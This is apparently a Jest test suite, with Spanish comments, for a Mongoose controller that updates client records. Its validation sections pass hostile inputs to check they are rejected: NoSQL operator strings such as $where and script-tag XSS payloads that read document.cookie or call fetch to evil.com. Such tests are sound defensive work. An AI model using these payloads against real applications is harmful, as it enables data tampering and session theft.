import { describe, test, expect, beforeAll, afterAll, beforeEach, jest } from '@jest/globals';
import mongoose from 'mongoose';

import {
    connectTestDB,
    disconnectTestDB,
    defineTestSchemas,
    testDb
} from '../../../helpers/mongoMemoryServer.js';

// ============================================================
// MOCKS DE MÓDULOS
// ============================================================

let mockTestConnection;

jest.unstable_mockModule('../../../../DB/mongoDB/config/init.js', () => ({
    db: testDb,
    procesoConn: {
        get readyState() { return mockTestConnection?.readyState ?? 1; },
        startSession: () => mockTestConnection.startSession()
    }
}));

jest.unstable_mockModule('../../../../events/eventos.js', () => ({
    procesoEventEmitter: { emit: jest.fn() }
}));

const { ClientesExpController } = await import('../../../../server/api/comercial/clientesExp.controller.js');

// ============================================================
// HELPERS
// ============================================================

let paisId;
const userId = new mongoose.Types.ObjectId();

/** Crea un cliente existente en la BD para las pruebas de update */
async function crearClienteExistente(overrides = {}) {
    const defaults = {
        CLIENTE: 'Cliente Original',
        CORREO: 'original@correo.com',
        DIRECCIÓN: 'Dirección Original',
        PAIS_DESTINO: [{ codigo: paisId, requiereGGN: false }],
        TELEFONO: '3001234567',
        ID: 'NIT-ORIGINAL',
        CODIGO: 200,
        activo: true,
        user: userId,
    };
    return testDb.Clientes.create({ ...defaults, ...overrides });
}

function buildReq(clienteId, dataOverrides = {}, userOverride) {
    return {
        user: userOverride !== undefined ? userOverride : { _id: userId },
        data: {
            _id: clienteId?.toString() ?? new mongoose.Types.ObjectId().toString(),
            action: 'put_comercial_clientes',
            data: {
                CLIENTE: 'Cliente Actualizado',
                CORREO: 'actualizado@correo.com',
                DIRECCIÓN: 'Dirección Actualizada',
                PAIS_DESTINO: [{ codigo: paisId.toString(), requiereGGN: true }],
                TELEFONO: '3009999999',
                ID: 'NIT-ACTUALIZADO',
                ...dataOverrides,
            },
        },
    };
}

/**
 * Helper: verifica que la promesa sea rechazada.
 * GlobalControllerErrorHandler lanza un objeto plano { status, message, type }
 * en vez de una instancia de Error, por lo que rejects.toThrow() no funciona.
 */
async function expectToReject(promise) {
    let resolved = false;
    try {
        await promise;
        resolved = true;
    } catch {
        // rechazada — correcto
    }
    expect(resolved).toBe(false);
}

// ============================================================
// SETUP / TEARDOWN
// ============================================================

describe('ClientesExpController.put_comercial_clientes', () => {
    beforeAll(async () => {
        mockTestConnection = await connectTestDB();
        await defineTestSchemas(mockTestConnection);

        const pais = await testDb.Paises.create({ nombre: 'Colombia', codigo: 'CO' });
        paisId = pais._id;

        await testDb.Seriales.create({ name: 'Cliente', serial: 100 });
    });

    afterAll(async () => {
        await disconnectTestDB();
    });

    beforeEach(async () => {
        await testDb.Clientes.deleteMany({});
        jest.clearAllMocks();
    });

    // ============================================================
    // CASOS DE ÉXITO
    // ============================================================

    describe('Casos de éxito', () => {
        test('debe actualizar un cliente correctamente', async () => {
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id);

            await ClientesExpController.put_comercial_clientes(req);

            const updated = await testDb.Clientes.findById(cliente._id);
            expect(updated.CLIENTE).toBe('Cliente Actualizado');
            expect(updated.CORREO).toBe('actualizado@correo.com');
            expect(updated.DIRECCIÓN).toBe('Dirección Actualizada');
            expect(updated.TELEFONO).toBe('3009999999');
            expect(updated.ID).toBe('NIT-ACTUALIZADO');
        });

        test('debe actualizar PAIS_DESTINO correctamente', async () => {
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id, {
                PAIS_DESTINO: [{ codigo: paisId.toString(), requiereGGN: true }],
            });

            await ClientesExpController.put_comercial_clientes(req);

            const updated = await testDb.Clientes.findById(cliente._id);
            expect(updated.PAIS_DESTINO).toHaveLength(1);
            expect(updated.PAIS_DESTINO[0].requiereGGN).toBe(true);
        });

        test('debe actualizar con múltiples países de destino', async () => {
            const pais2 = await testDb.Paises.create({ nombre: 'Ecuador', codigo: 'EC' });
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id, {
                PAIS_DESTINO: [
                    { codigo: paisId.toString(), requiereGGN: false },
                    { codigo: pais2._id.toString(), requiereGGN: true },
                ],
            });

            await ClientesExpController.put_comercial_clientes(req);

            const updated = await testDb.Clientes.findById(cliente._id);
            expect(updated.PAIS_DESTINO).toHaveLength(2);
        });

        test('debe guardar el user._id en el documento actualizado', async () => {
            const otroUser = new mongoose.Types.ObjectId();
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id, {}, { _id: otroUser });

            await ClientesExpController.put_comercial_clientes(req);

            const updated = await testDb.Clientes.findById(cliente._id);
            expect(updated.user.toString()).toBe(otroUser.toString());
        });

        test('no debe modificar el CODIGO del cliente', async () => {
            const cliente = await crearClienteExistente({ CODIGO: 500 });
            const req = buildReq(cliente._id);

            await ClientesExpController.put_comercial_clientes(req);

            const updated = await testDb.Clientes.findById(cliente._id);
            expect(updated.CODIGO).toBe(500);
        });

        test('no debe afectar otros clientes en la BD', async () => {
            const cliente1 = await crearClienteExistente({ CODIGO: 301, CLIENTE: 'Intocable' });
            const cliente2 = await crearClienteExistente({ CODIGO: 302, CLIENTE: 'Será Modificado' });
            const req = buildReq(cliente2._id, { CLIENTE: 'Modificado' });

            await ClientesExpController.put_comercial_clientes(req);

            const intocable = await testDb.Clientes.findById(cliente1._id);
            expect(intocable.CLIENTE).toBe('Intocable');
        });
    });

    // ============================================================
    // ERRORES DE USUARIO / AUTENTICACIÓN
    // ============================================================

    describe('Errores de usuario', () => {
        test('debe fallar si user es null', async () => {
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id, {}, null);
            await expect(ClientesExpController.put_comercial_clientes(req))
                .rejects.toThrow('Usuario no encontrado');
        });

        test('debe fallar si user es undefined', async () => {
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id);
            req.user = undefined;
            await expect(ClientesExpController.put_comercial_clientes(req))
                .rejects.toThrow('Usuario no encontrado');
        });

        test('debe fallar si user no tiene _id', async () => {
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id, {}, { nombre: 'sin id' });
            await expect(ClientesExpController.put_comercial_clientes(req))
                .rejects.toThrow('Usuario no encontrado');
        });

        test('debe fallar si user es un objeto vacío', async () => {
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id, {}, {});
            await expect(ClientesExpController.put_comercial_clientes(req))
                .rejects.toThrow('Usuario no encontrado');
        });
    });

    // ============================================================
    // ERRORES DE VALIDACIÓN ZOD — campos requeridos
    // ============================================================

    describe('Validación Zod - campos requeridos', () => {
        test('debe fallar si falta _id en data', async () => {
            const req = buildReq(null);
            req.data._id = undefined;
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si _id no es un ObjectId válido', async () => {
            const req = buildReq(null);
            req.data._id = 'no-es-objectid';
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si falta CLIENTE', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: '' }))
            );
        });

        test('debe fallar si falta CORREO', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CORREO: '' }))
            );
        });

        test('debe fallar si CORREO no es email válido', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CORREO: 'no-es-email' }))
            );
        });

        test('debe fallar si falta DIRECCIÓN', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { DIRECCIÓN: '' }))
            );
        });

        test('debe fallar si falta TELEFONO', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { TELEFONO: '' }))
            );
        });

        test('debe fallar si falta ID', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { ID: '' }))
            );
        });

        test('debe fallar si PAIS_DESTINO está vacío', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { PAIS_DESTINO: [] }))
            );
        });

        test('debe fallar si PAIS_DESTINO tiene codigo inválido', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { PAIS_DESTINO: [{ codigo: 'invalido', requiereGGN: false }] })
                )
            );
        });

        test('debe fallar si PAIS_DESTINO no tiene requiereGGN', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { PAIS_DESTINO: [{ codigo: paisId.toString() }] })
                )
            );
        });

        test('debe fallar si action no es "put_comercial_clientes"', async () => {
            const cliente = await crearClienteExistente();
            const req = buildReq(cliente._id);
            req.data.action = 'otra_accion';
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si data es undefined', async () => {
            const req = { user: { _id: userId }, data: { _id: new mongoose.Types.ObjectId().toString(), action: 'put_comercial_clientes' } };
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('no debe modificar el documento cuando la validación falla', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: '' }))
            );

            const sinCambio = await testDb.Clientes.findById(cliente._id);
            expect(sinCambio.CLIENTE).toBe('Cliente Original');
        });
    });

    // ============================================================
    // DATOS MALICIOSOS — NoSQL injection
    // ============================================================

    describe('Datos maliciosos - NoSQL injection', () => {
        test('debe rechazar CLIENTE con operador $gt', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: '{ "$gt": "" }' }))
            );
        });

        test('debe rechazar CLIENTE con $ne', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: '$ne' }))
            );
        });

        test('debe rechazar DIRECCIÓN con $where', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { DIRECCIÓN: '$where: function() { return true }' })
                )
            );
        });

        test('debe rechazar TELEFONO con $regex', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { TELEFONO: '$regex' }))
            );
        });

        test('debe rechazar ID con $set', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { ID: '$set' }))
            );
        });

        test('debe rechazar campos con llaves { }', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { CLIENTE: 'test { injection }' })
                )
            );
        });

        test('no debe guardar datos maliciosos en BD', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { CLIENTE: '$ne', DIRECCIÓN: '$where' })
                )
            );

            const sinCambio = await testDb.Clientes.findById(cliente._id);
            expect(sinCambio.CLIENTE).toBe('Cliente Original');
        });
    });

    // ============================================================
    // DATOS MALICIOSOS — XSS
    // ============================================================

    describe('Datos maliciosos - XSS', () => {
        test('debe rechazar CLIENTE con <script>', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { CLIENTE: '<script>alert("xss")</script>' })
                )
            );
        });

        test('debe rechazar DIRECCIÓN con <script>', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { DIRECCIÓN: '<script>document.cookie</script>' })
                )
            );
        });

        test('debe rechazar TELEFONO con <script>', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { TELEFONO: '<script>fetch("http://evil.com")</script>' })
                )
            );
        });

        test('debe rechazar ID con <script>', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { ID: '<script>alert(1)</script>' })
                )
            );
        });
    });

    // ============================================================
    // DATOS MALICIOSOS — tipos inválidos, null, undefined, Infinity, NaN
    // ============================================================

    describe('Datos maliciosos - tipos inválidos', () => {
        test('debe fallar si CLIENTE es null', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: null }))
            );
        });

        test('debe fallar si CLIENTE es undefined', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: undefined }))
            );
        });

        test('debe fallar si CLIENTE es un número', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: 12345 }))
            );
        });

        test('debe fallar si CLIENTE es un boolean', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: true }))
            );
        });

        test('debe fallar si CLIENTE es un array', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: ['a', 'b'] }))
            );
        });

        test('debe fallar si CLIENTE es un objeto', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: { $gt: '' } }))
            );
        });

        test('debe fallar si CORREO es null', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CORREO: null }))
            );
        });

        test('debe fallar si TELEFONO es Infinity', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { TELEFONO: Infinity }))
            );
        });

        test('debe fallar si TELEFONO es NaN', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { TELEFONO: NaN }))
            );
        });

        test('debe fallar si PAIS_DESTINO es null', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { PAIS_DESTINO: null }))
            );
        });

        test('debe fallar si PAIS_DESTINO es un string', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { PAIS_DESTINO: 'colombia' }))
            );
        });

        test('debe fallar si PAIS_DESTINO tiene requiereGGN como string', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(
                    buildReq(cliente._id, { PAIS_DESTINO: [{ codigo: paisId.toString(), requiereGGN: 'true' }] })
                )
            );
        });

        test('debe fallar si _id es null', async () => {
            const req = buildReq(null);
            req.data._id = null;
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si _id es un número', async () => {
            const req = buildReq(null);
            req.data._id = 12345;
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si _id es Infinity', async () => {
            const req = buildReq(null);
            req.data._id = Infinity;
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si _id es NaN', async () => {
            const req = buildReq(null);
            req.data._id = NaN;
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si data es null', async () => {
            const req = { user: { _id: userId }, data: null };
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('debe fallar si data.data es un string', async () => {
            const req = {
                user: { _id: userId },
                data: { _id: new mongoose.Types.ObjectId().toString(), action: 'put_comercial_clientes', data: 'string malicioso' }
            };
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('no debe modificar el documento con datos inválidos', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: null }))
            );

            const sinCambio = await testDb.Clientes.findById(cliente._id);
            expect(sinCambio.CLIENTE).toBe('Cliente Original');
        });
    });

    // ============================================================
    // _id QUE NO EXISTE EN LA BD
    // ============================================================

    describe('Cliente no encontrado', () => {
        test('debe fallar si el _id no existe en la base de datos', async () => {
            const idInexistente = new mongoose.Types.ObjectId();
            const req = buildReq(idInexistente);
            await expectToReject(ClientesExpController.put_comercial_clientes(req));
        });

        test('no debe crear un documento nuevo si el _id no existe', async () => {
            const idInexistente = new mongoose.Types.ObjectId();
            const req = buildReq(idInexistente);
            await expectToReject(ClientesExpController.put_comercial_clientes(req));

            const clientes = await testDb.Clientes.find({});
            expect(clientes).toHaveLength(0);
        });
    });

    // ============================================================
    // INTEGRIDAD TRANSACCIONAL — rollback
    // ============================================================

    describe('Integridad transaccional', () => {
        test('debe hacer rollback si actualizar_data falla', async () => {
            const cliente = await crearClienteExistente();

            // _id válido en formato pero que no existe, forzando error en findOneAndUpdate
            const idFantasma = new mongoose.Types.ObjectId();
            const req = buildReq(idFantasma);

            await expectToReject(ClientesExpController.put_comercial_clientes(req));

            // El cliente original no debe haberse modificado
            const sinCambio = await testDb.Clientes.findById(cliente._id);
            expect(sinCambio.CLIENTE).toBe('Cliente Original');
        });

        test('no debe quedar en estado inconsistente después de un error de validación', async () => {
            const cliente = await crearClienteExistente();

            // Primero falla con datos inválidos
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: '$ne' }))
            );

            // Luego funciona con datos válidos
            await ClientesExpController.put_comercial_clientes(
                buildReq(cliente._id, { CLIENTE: 'Nuevo Nombre Válido' })
            );

            const updated = await testDb.Clientes.findById(cliente._id);
            expect(updated.CLIENTE).toBe('Nuevo Nombre Válido');
        });

        test('no debe modificar el documento si la sesión se aborta', async () => {
            const cliente = await crearClienteExistente();

            // Request con _id formato válido pero inexistente para provocar error dentro de la transacción
            const req = buildReq(new mongoose.Types.ObjectId());

            await expectToReject(ClientesExpController.put_comercial_clientes(req));

            // Verificamos que no se modificó nada
            const clientes = await testDb.Clientes.find({});
            expect(clientes).toHaveLength(1);
            expect(clientes[0].CLIENTE).toBe('Cliente Original');
        });
    });

    // ============================================================
    // STRINGS EXTREMOS
    // ============================================================

    describe('Datos extremos - strings', () => {
        test('no debe crashear con CLIENTE de 10000 caracteres', async () => {
            const cliente = await crearClienteExistente();
            const longString = 'A'.repeat(10000);
            const req = buildReq(cliente._id, { CLIENTE: longString });

            try {
                await ClientesExpController.put_comercial_clientes(req);
                const updated = await testDb.Clientes.findById(cliente._id);
                expect(updated).toBeDefined();
                expect(updated.CLIENTE).toBe(longString);
            } catch {
                // Si falla también es aceptable
                expect(true).toBe(true);
            }
        });

        test('acepta CLIENTE con solo espacios (requiredSafeString no hace trim)', async () => {
            const cliente = await crearClienteExistente();
            await ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CLIENTE: '   ' }));
            const updated = await testDb.Clientes.findById(cliente._id);
            expect(updated.CLIENTE).toBe('   ');
        });

        test('debe manejar CORREO con espacios', async () => {
            const cliente = await crearClienteExistente();
            await expectToReject(
                ClientesExpController.put_comercial_clientes(buildReq(cliente._id, { CORREO: '  correo @test.com  ' }))
            );
        });
    });
});
